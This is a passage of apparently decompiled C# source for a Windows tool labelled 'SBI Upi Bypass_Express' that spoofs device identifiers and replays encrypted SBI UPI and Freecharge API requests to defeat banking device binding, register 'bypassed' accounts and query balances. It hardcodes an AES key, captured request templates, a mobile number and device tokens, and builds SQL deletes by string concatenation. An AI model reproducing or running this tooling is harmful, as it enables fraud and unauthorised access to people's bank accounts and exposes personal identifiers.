			string text62 = "{\"accountId\":0,\"addInfo\":{\"addInfo10\":\"NA\",\"addInfo9\":\"NA\"},\"deviceInfo\":{\"androidId\":\"0eb6a5ba728b5b89\",\"appGenId\":\"1887b77a846825fce063b0d5bf0a2e89\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"0eb6a5ba728b5b89\",\"deviceType\":\"MOB\",\"fcmToken\":\"rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android12\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"0f9a9d2bf0e85bfc3\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"mpinCred\":{\"atmCrdLength\":0,\"credentialDataCode\":\"NPCI\",\"credentialDataKi\":\"20150822\",\"credentialDataLength\":0,\"credentialDataValue\":\"credvaluereplace\",\"credentialSubType\":\"MPIN\",\"credentialType\":\"PIN\",\"otpCrdLength\":0},\"npciTransId\":\"SBI9208DFB7A05B4841977F6865E910C127\",\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI8B10D57DEA63432A94B01C2A3F42D417\"}}";
			string oldValue18 = "SBI8B10D57DEA63432A94B01C2A3F42D417";
			string text63 = text62.Replace(oldValue18, text33.Trim());
			string oldValue19 = "1887b77a846825fce063b0d5bf0a2e89";
			string text64 = text63.Replace(oldValue19, newValue4);
			string oldValue20 = "9140903684";
			string text65 = text64.Replace(oldValue20, text6);
			string oldValue21 = "0eb6a5ba728b5b89";
			string text66 = text65.Replace(oldValue21, text5);
			string oldValue22 = "rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp";
			string text67 = text66.Replace(oldValue22, newValue3);
			string oldValue23 = "0f9a9d2bf0e85bfc3";
			string text68 = text67.Replace(oldValue23, newValue5);
			string oldValue24 = "193780768";
			string text69 = text68.Replace(oldValue24, newValue2);
			string oldValue25 = "credvaluereplace";
			string text70 = text69.Replace(oldValue25, newValue9);
			string oldValue26 = "SBI9208DFB7A05B4841977F6865E910C127";
			string text71 = text70.Replace(oldValue26, text38);
			string text72 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"msgidd\"}";
			this.text6 = text72;
			string hex3 = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
			key = StringToByteArray(hex3);
			newValue6 = AESGCMEncrypt(text71, key, new byte[12]);
			string text73 = this.text6;
			string oldValue27 = "msgidd";
			this.text6 = text73.Replace(oldValue27, newValue6);
			string text74 = "https://upionline.sbi/upi/api/getAccBalConfWeb";
			string_93 = text74;
			_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, 15000, 15000, ref string_96, ref string_95, ref webException_0);
			string str11 = string_96;
			string what14 = "resp";
			string_96 = jsonData_Serial(str11, what14);
			string_96 = AESGCMDecrypt(string_96, key, new byte[12]);
			string text75 = string_96;
			string value5 = "accountBalance";
			if (text75.Contains(value5))
			{
				return string_96;
			}
			string text76 = string_96;
			string value6 = "Your request couldn't be processed due to technical reasons. Please try later";
			if (text76.Contains(value6))
			{
				string text77 = "Device Changed Detected Please delete and bypass again";
				MessageBox.Show(text77);
				Close();
			}
			else
			{
				string str12 = string_96;
				string what15 = "statusDesc";
				string text78 = jsonData_Serial(str12, what15);
				label2.Visible = true;
				label2.Text = text78;
			}
		}
		string text79 = "AXIFRC";
		string chars = "0123456789abcdef";
		string text80 = text79 + RandomString(29, chars);
		string[] array7 = new string[8];
		string text81 = "|";
		array7[0] = text81;
		array7[1] = text80;
		string text82 = "|||";
		array7[2] = text82;
		array7[3] = packageName;
		string text83 = "|91";
		array7[4] = text83;
		array7[5] = mobnumber;
		string text84 = "|";
		array7[6] = text84;
		array7[7] = oemdeviceid;
		string input2 = string.Concat(array7);
		string text85 = "tokenSecondService";
		string text86 = sha256_hashing(input2, text85);
		string text87 = text3;
		string[] array8 = new string[5] { text87, null, null, null, null };
		string text88 = "|";
		array8[1] = text88;
		array8[2] = text80;
		string text89 = "|";
		array8[3] = text89;
		array8[4] = text86;
		string newValue10 = RSA_ENCRYPT_PKEY(string.Concat(array8), miib);
		string[] array9 = new string[41];
		string text90 = "{\"ac\":{\"accRefNumber\":\"";
		array9[0] = text90;
		array9[1] = accRefNumber;
		string text91 = "\",\"address\":null,\"aeba\":\"Y\",\"atmpinFormat\":\"FORMAT3|FORMAT1\",\"atmpinlength\":\"";
		array9[2] = text91;
		array9[3] = atmpinlengh;
		string text92 = "\",\"balTime\":\"\",\"balance\":\"\",\"bankId\":null,\"bankName\":\"";
		array9[4] = text92;
		array9[5] = bankName;
		string text93 = "\",\"dLength\":\"";
		array9[6] = text93;
		array9[7] = dLength;
		string text94 = "\",\"dType\":\"NUM\",\"dlength\":\"";
		array9[8] = text94;
		array9[9] = dlength;
		string text95 = "\",\"dtype\":\"NUM\",\"ifsc\":\"";
		array9[10] = text95;
		array9[11] = ifsc;
		string text96 = "\",\"iin\":\"";
		array9[12] = text96;
		array9[13] = bankcode;
		string text97 = "\",\"logo\":\"";
		array9[14] = text97;
		array9[15] = logo;
		string text98 = "\",\"maskedAccnumber\":\"";
		array9[16] = text98;
		array9[17] = maskedAccnumber;
		string text99 = "\",\"mbeba\":\"Y\",\"mmid\":null,\"name\":\"";
		array9[18] = text99;
		array9[19] = names;
		string text100 = "\",\"otpFormat\":\"NUM\",\"otpLength\":\"";
		array9[20] = text100;
		array9[21] = otpLength;
		string text101 = "\",\"partyId\":null,\"status\":\"A\",\"type\":\"";
		array9[22] = text101;
		array9[23] = typea;
		string text102 = "\",\"uidnum\":null,\"vpa\":\"";
		array9[24] = text102;
		array9[25] = upiid;
		string text103 = "\"},\"bankId\":\"";
		array9[26] = text103;
		array9[27] = bankcode;
		string text104 = "\",\"cred\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.1|N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==\",\"ki\":\"";
		array9[28] = text104;
		array9[29] = ki;
		string text105 = "\"},\"subType\":\"MPIN\",\"type\":\"PIN\"},\"customerId\":\"";
		array9[30] = text105;
		array9[31] = customerid;
		string text106 = "\",\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"";
		array9[32] = text106;
		array9[33] = mobnumber;
		string text107 = "\",\"id\":\"";
		array9[34] = text107;
		array9[35] = oemdeviceid;
		string text108 = "\",\"ip\":\"192.168.0.66\",\"mobile\":\"";
		array9[36] = text108;
		array9[37] = mobnumber;
		string text109 = "\",\"os\":\"android\",\"type\":\"MOB\"},\"txnid\":\"";
		array9[38] = text109;
		array9[39] = text80;
		string text110 = "\"}";
		array9[40] = text110;
		this.text6 = string.Concat(array9);
		string text111 = this.text6;
		string oldValue28 = "N7MwAQgDTF6yBVPhQRPtQWJrzM6MHYFM9TPS5waTe3Nl5Nz2chVg+tnhZ79HENK5dNCz2aE5uG4NefmQNE8+h+GxQ4b4ojKawK1XsZ0Hy7fl1EM8uGP1mEp09+vsxCvfUQ3OyEnd7ACcKYkQcivqu7KtgU6X4VLNhOLBH2K5JiOCnOJ+Exwo5WlyM1cscJrAJCh2+oBx90thOUadhptT9zMTjBtB3EEiHvTM5ZGlySkDBnGjFV1OIwBWHYOCHVGJ3YxsT8Gb5OviuiSvQ7dnF24XBqV+zudpMKtttXl+FqiQv4NWcmQC21fQR6lic8GShpCqBPEck0QlEgLg==";
		this.text6 = text111.Replace(oldValue28, newValue10);
		string text112 = "https://mobile-rest.freecharge.in/rest/upi/v2/ar/balance-enquiry?fcAppType=android&fcChannel=3&fcversion=394";
		string_93 = text112;
		_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0);
		return string_96;
	}

	private void button3_Click(object sender, EventArgs e)
	{
		string text = listBox1.SelectedItem.ToString();
		string text2 = ".\\BHIM_SBIUPI\\";
		string text3 = ".rg";
		Path_ = string.Concat(str1: text2 + text + text3, str0: Directory.GetCurrentDirectory());
		if (File.Exists(Path_))
		{
			File.Delete(Path_);
		}
		try
		{
			string text4 = "SBIUPI_";
			string text5 = text4 + text;
			string oldValue = ".rg";
			string newValue = "\0";
			string text6 = text5.Replace(oldValue, newValue);
			SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
			sQLiteConnection.Open();
			SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
			string text7 = "DELETE from TBL_BANK where BANK_SAVEAS = '";
			string text8 = "' AND BANK_ISDEBIT = 0";
			sQLiteCommand.CommandText = text7 + text6 + text8;
			string oldValue2 = "@sbi";
			string text9 = text.Replace(oldValue2, "");
			string text10 = "DELETE FROM TBL_SBIUPI WHERE MobNo = '";
			string text11 = "'";
			string query = text10 + text9 + text11;
			ExecuteQuery(query);
			sQLiteCommand.ExecuteNonQuery();
			sQLiteConnection.Close();
			sQLiteCommand.Dispose();
		}
		catch
		{
		}
		string text12 = "Bypass Delete Sucessfull...";
		MessageBox.Show(text12);
		Close();
	}

	private void Freecharge_Load(object sender, EventArgs e)
	{
	}

	private void btnClose_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void bunifuImageButton1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void pnlHeader_Paint(object sender, PaintEventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void InitializeComponent()
	{
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(SbiUpiByPass));
            this.mobilenumber = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.btnNext = new System.Windows.Forms.Button();
            this.btnCopy = new System.Windows.Forms.Button();
            this.txtSms = new System.Windows.Forms.RichTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.label4 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.label6 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.pnlHeader = new System.Windows.Forms.Panel();
            this.label5 = new System.Windows.Forms.Label();
            this.bunifuImageButton1 = new Bunifu.Framework.UI.BunifuImageButton();
            this.btnClose = new Bunifu.Framework.UI.BunifuImageButton();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.pnlHeader.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.bunifuImageButton1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnClose)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.SuspendLayout();
            // 
            // mobilenumber
            // 
            this.mobilenumber.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.mobilenumber.Location = new System.Drawing.Point(119, 6);
            this.mobilenumber.Name = "mobilenumber";
            this.mobilenumber.Size = new System.Drawing.Size(212, 26);
            this.mobilenumber.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.Color.Black;
            this.button1.Location = new System.Drawing.Point(119, 79);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(212, 37);
            this.button1.TabIndex = 1;
            this.button1.Text = "Start";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // btnNext
            // 
            this.btnNext.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.btnNext.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnNext.Location = new System.Drawing.Point(215, 284);
            this.btnNext.Name = "btnNext";
            this.btnNext.Size = new System.Drawing.Size(216, 33);
            this.btnNext.TabIndex = 1183;
            this.btnNext.Text = "Next";
            this.btnNext.UseVisualStyleBackColor = false;
            this.btnNext.Visible = false;
            this.btnNext.Click += new System.EventHandler(this.btnNext_Click);
            // 
            // btnCopy
            // 
            this.btnCopy.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.btnCopy.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCopy.Location = new System.Drawing.Point(264, 509);
            this.btnCopy.Name = "btnCopy";
            this.btnCopy.Size = new System.Drawing.Size(67, 20);
            this.btnCopy.TabIndex = 1184;
            this.btnCopy.Text = "Copy";
            this.btnCopy.UseVisualStyleBackColor = false;
            this.btnCopy.Visible = false;
            this.btnCopy.Click += new System.EventHandler(this.btnCopy_Click);
            // 
            // txtSms
            // 
            this.txtSms.Location = new System.Drawing.Point(213, 122);
            this.txtSms.Name = "txtSms";
            this.txtSms.Size = new System.Drawing.Size(218, 116);
            this.txtSms.TabIndex = 1182;
            this.txtSms.Text = "";
            this.txtSms.Visible = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(212, 241);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(219, 16);
            this.label1.TabIndex = 1181;
            this.label1.Text = "QR Ko Scan Karke SMS Send Kare.";
            this.label1.Visible = false;
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.SystemColors.ButtonHighlight;
            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.Red;
            this.label2.Location = new System.Drawing.Point(12, 525);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(0, 18);
            this.label2.TabIndex = 1185;
            this.label2.Visible = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(78, 12);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(35, 16);
            this.label3.TabIndex = 1187;
            this.label3.Text = " +91-";
            // 
            // listBox1
            // 
            this.listBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listBox1.FormattingEnabled = true;
            this.listBox1.ItemHeight = 17;
            this.listBox1.Location = new System.Drawing.Point(60, 54);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(295, 140);
            this.listBox1.TabIndex = 1188;
            this.listBox1.SelectedIndexChanged += new System.EventHandler(this.listBox1_SelectedIndexChanged);
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(222, 35);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(133, 16);
            this.label4.TabIndex = 1189;
            this.label4.Text = "List Of Bypassed UPI";
            // 
            // button2
            // 
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button2.ForeColor = System.Drawing.Color.Black;
            this.button2.Location = new System.Drawing.Point(60, 214);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(155, 37);
            this.button2.TabIndex = 1190;
            this.button2.Text = "Check Balance";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button3
            // 
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.System;
            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.Location = new System.Drawing.Point(221, 214);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(134, 37);
            this.button3.TabIndex = 1191;
            this.button3.Text = "Delete";
            this.button3.UseVisualStyleBackColor = false;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.Location = new System.Drawing.Point(6, 45);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(161, 16);
            this.label6.TabIndex = 1219;
            this.label6.Text = "SBI APP 6 Digit Password";
            // 
            // textBox1
            // 
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.Location = new System.Drawing.Point(173, 38);
            this.textBox1.MaxLength = 6;
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(158, 26);
            this.textBox1.TabIndex = 1218;
            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
            // 
            // pictureBox2
            // 
            this.pictureBox2.Location = new System.Drawing.Point(126, 366);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(179, 158);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 1217;
            this.pictureBox2.TabStop = false;
            // 
            // pnlHeader
            // 
            this.pnlHeader.BackColor = System.Drawing.Color.FromArgb(22, 14, 28);
            this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.pnlHeader.Controls.Add(this.label5);
            this.pnlHeader.Controls.Add(this.bunifuImageButton1);
            this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
            this.pnlHeader.ForeColor = System.Drawing.Color.Black;
            this.pnlHeader.Location = new System.Drawing.Point(0, 0);
            this.pnlHeader.Name = "pnlHeader";
            this.pnlHeader.Size = new System.Drawing.Size(444, 22);
            this.pnlHeader.TabIndex = 1216;
            this.pnlHeader.Paint += new System.Windows.Forms.PaintEventHandler(this.pnlHeader_Paint);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Underline))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(127, 3);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(177, 17);
            this.label5.TabIndex = 1188;
            this.label5.Text = "SBI Upi Bypass_Express";
            // 
            // bunifuImageButton1
            // 
            this.bunifuImageButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.bunifuImageButton1.BackColor = System.Drawing.Color.Transparent;
            this.bunifuImageButton1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.bunifuImageButton1.Image = ((System.Drawing.Image)(resources.GetObject("bunifuImageButton1.Image")));
            this.bunifuImageButton1.ImageActive = null;
            this.bunifuImageButton1.Location = new System.Drawing.Point(422, 0);
            this.bunifuImageButton1.Name = "bunifuImageButton1";
            this.bunifuImageButton1.Size = new System.Drawing.Size(22, 22);
            this.bunifuImageButton1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.bunifuImageButton1.TabIndex = 1;
            this.bunifuImageButton1.TabStop = false;
            this.bunifuImageButton1.Zoom = 10;
            this.bunifuImageButton1.Click += new System.EventHandler(this.bunifuImageButton1_Click);
            // 
            // btnClose
            // 
            this.btnClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btnClose.BackColor = System.Drawing.Color.Transparent;
            this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnClose.Image = ((System.Drawing.Image)(resources.GetObject("btnClose.Image")));
            this.btnClose.ImageActive = null;
            this.btnClose.Location = new System.Drawing.Point(418, 6);
            this.btnClose.Name = "btnClose";
            this.btnClose.Size = new System.Drawing.Size(26, 20);
            this.btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.btnClose.TabIndex = 1;
            this.btnClose.TabStop = false;
            this.btnClose.Zoom = 10;
            this.btnClose.Click += new System.EventHandler(this.btnClose_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(9, 122);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(195, 195);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 1192;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Visible = false;
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new System.Drawing.Point(0, 23);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(445, 348);
            this.tabControl1.TabIndex = 1220;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.label3);
            this.tabPage1.Controls.Add(this.label6);
            this.tabPage1.Controls.Add(this.mobilenumber);
            this.tabPage1.Controls.Add(this.textBox1);
            this.tabPage1.Controls.Add(this.button1);
            this.tabPage1.Controls.Add(this.label1);
            this.tabPage1.Controls.Add(this.txtSms);
            this.tabPage1.Controls.Add(this.btnCopy);
            this.tabPage1.Controls.Add(this.pictureBox1);
            this.tabPage1.Controls.Add(this.btnNext);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(437, 322);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Register New";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.listBox1);
            this.tabPage2.Controls.Add(this.pictureBox2);
            this.tabPage2.Controls.Add(this.button2);
            this.tabPage2.Controls.Add(this.button3);
            this.tabPage2.Controls.Add(this.label4);
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(437, 322);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Check Balance $ Delete";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // SbiUpiByPass
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(444, 371);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.pnlHeader);
            this.Controls.Add(this.btnClose);
            this.Controls.Add(this.label2);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "SbiUpiByPass";
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Show;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "SBI UPI by Express";
            this.Load += new System.EventHandler(this.Freecharge_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.pnlHeader.ResumeLayout(false);
            this.pnlHeader.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.bunifuImageButton1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.btnClose)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

	}

	static SbiUpiByPass()
	{
		Jan1st1970 = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
		string text = "FREECHARGE_V2";
		freeChargeApiHeader = text;
		random = new Random();
		LenghtAesKeyBytes = 32;
		rngCsp = new RNGCryptoServiceProvider();
		string text2 = "0123456789ABCDEF";
		hexArray = text2.ToCharArray();
		string text3 = "-----BEGIN CERTIFICATE-----\r\nMIIFLjCCBBagAwIBAgIKfTdiiSFa2sBLBTANBgkqhkiG9w0BAQsFADCB9zELMAkG\r\nA1UEBhMCSU4xRTBDBgNVBAoTPEluc3RpdHV0ZSBmb3IgRGV2ZWxvcG1lbnQgYW5k\r\nIFJlc2VhcmNoIGluIEJhbmtpbmcgVGVjaG5vbG9neTEdMBsGA1UECxMUQ2VydGlm\r\neWluZyBBdXRob3JpdHkxDzANBgNVBBETBjUwMDA1NzEXMBUGA1UECBMOQW5kaHJh\r\nIFByYWRlc2gxKTAnBgNVBAkTIFJvYWQgTm8uMSwgTWFzYWIgVGFuaywgSHlkZXJh\r\nYmFkMRUwEwYDVQQzEwxDYXN0bGUgSGlsbHMxFjAUBgNVBAMTDUlEUkJUIENBIDIw\r\nMTQwHhcNMjIwMTE5MTAzNzQxWhcNMjQwMTE5MTgyOTU5WjASMRAwDgYDVQQDEwd1\r\ncGlucGNpMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsqMattxoTibl\r\naGsAneFo5TgFfvRltQ2CqteIgUVJlLMz95P35Y+GQc2EOjVEO0L1OUd5IDTIBaqh\r\nrTqeWypOyna+CsHPqDRY0vsklCYizw/VQkdwLBZHMMhU4jL4wciE7qcf2kdyri6B\r\n135SzUF5IGPn4SnSkeB3IqHzneUrabP0lJweLF7IU5l9qtpPa6A5cH1iVKQT5YAI\r\n4NWH+3E/MRNKvdqgU1PILlOEaVB0vJZ1pBWW1aMaecoHfzC8/pTfM2PJ5s/CDbR0\r\n4xqX9/AYmkt34jMwBKvboyWjD1UgCkPnJd3SaZ4vDpA+nyTITM6uGOI6e6sv/b6v\r\ntF7nbM3H7wIDAQABo4IBnjCCAZowDAYDVR0TAQH/BAIwADAOBgNVHQ8BAf8EBAMC\r\nBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwIwHwYDVR0jBBgwFoAUgHUCNAfUXg7OBWq1\r\nrPAQa0IbB8cwHQYDVR0OBBYEFCqUhMqiWp2DKVBcdmAnVYkwuG+cMGwGCCsGAQUF\r\nBwEBBGAwXjA0BggrBgEFBQcwAoYoaHR0cDovL2lkcmJ0Y2Eub3JnLmluL2NlcnQv\r\nY2VydF8yN0IwLmNlcjAmBggrBgEFBQcwAYYaaHR0cDovL29jc3AuaWRyYnRjYS5v\r\ncmcuaW4wDwYDVR0RBAgwBocEZw6h8